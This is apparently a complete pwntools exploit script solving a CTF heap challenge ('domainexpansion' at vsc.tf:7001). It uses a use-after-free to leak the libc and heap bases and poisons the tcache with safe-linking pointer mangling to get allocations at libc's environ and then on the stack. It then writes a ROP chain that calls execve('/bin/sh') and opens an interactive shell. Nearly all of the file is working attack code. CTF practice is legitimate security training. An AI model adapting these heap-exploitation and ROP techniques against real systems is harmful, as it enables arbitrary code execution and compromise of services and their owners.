#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './domainexpansion_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'vsc.tf', 7001

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
breakrva 0x019f5
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec domainexpansion
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled

def create(idx, size):
    io.sendlineafter(b'choice:', b'1')
    io.sendlineafter(b'index:', str(idx).encode())
    io.sendlineafter(b'size:', str(size).encode())

def edit(idx, data):
    io.sendlineafter(b'choice:', b'2')
    io.sendlineafter(b'index:', str(idx).encode())
    io.sendlineafter(b'data:', data)

def read(idx):
    io.sendlineafter(b'choice:', b'3')
    io.sendlineafter(b'index:', str(idx).encode())

    io.recvuntil(b'Data:')
    return io.recvline().strip()

def delete(idx):
    io.sendlineafter(b'choice:', b'4')
    io.sendlineafter(b'index:', str(idx).encode())

def domain_expansion(idx, newsize):
    io.sendlineafter(b'choice:', b'260')
    io.sendlineafter(b'index:', str(idx).encode())
    io.sendlineafter(b'size:', str(newsize).encode())

def demangle(obfus_ptr):
    o2 = (obfus_ptr >> 12) ^ obfus_ptr
    return (o2 >> 24) ^ o2

def mangle(pos, ptr):
	return (pos>>12) ^ ptr

def exploit():
    global io
    io = initialize()
    
    create(0, 0x500)
    create(1, 0x10)

    delete(0)
    create(0, 0x500)
    libc.address = u64(read(0)[:8].ljust(8, b'\x00')) - 0x21ace0

    create(2, 0x60)
    create(3, 0x60)
    create(4, 0x60)

    domain_expansion(2, 0x91)
    delete(2)
    delete(4)
    delete(3)

    create(2, 0x80)
    heap = u64(read(2)[:8].ljust(8, b'\x00')) << 12

    offset = 0x68
    payload = flat({
        offset: [
            0x71,
            mangle(heap, libc.sym['environ'])
        ]
    }, filler=b'\x00')
    edit(2, payload)

    create(3, 0x60)
    create(5, 0x60) # environ

    stack_leak = u64(read(5)[:8].ljust(8, b'\x00'))
    rip = stack_leak - 0x120

    create(6, 0x60)
    delete(6)
    delete(3)

    payload = flat({
        offset: [
            0x71,
            mangle(heap, rip-0x8) # alignment
        ]
    })
    edit(2, payload)

    create(3, 0x60)
    create(7, 0x60) # rip

    one_gadgets = [0x50a47, 0xebc81, 0xebc85, 0xebc88, 0xebce2, 0xebd3f, 0xebd43]
    # payload = flat([
    #     elf.bss() + 0x400,
    #     libc.address + 0x2a3e5, # pop rdi; ret
    #     next(libc.search(b'/bin/sh\x00')),
    #     libc.address + 0x29139, # ret
    #     libc.sym['system']
    # ])

    payload = flat([
        0x0,
        libc.address + 0x2a3e5, # pop rdi; ret
        next(libc.search(b'/bin/sh\x00')),
        libc.address + 0x2be51, # pop rsi; ret
        0x0,
        libc.address + 0x11f2e7, # pop rdx; pop r12; ret
        0x0,
        0x0,
        libc.address + 0x045eb0, # pop rax; ret
        0x3b,
        libc.address + 0x29db4, # syscall
    ])
    edit(7, payload)

    io.sendlineafter(b'choice:', b'5') # trigger ROP
    io.sendline(b'cat flag*')

    log.success('libc base: %#x', libc.address)
    log.success('heap base: %#x', heap)
    log.success('rip: %#x', rip)
    io.interactive()
    
if __name__ == '__main__':
    exploit()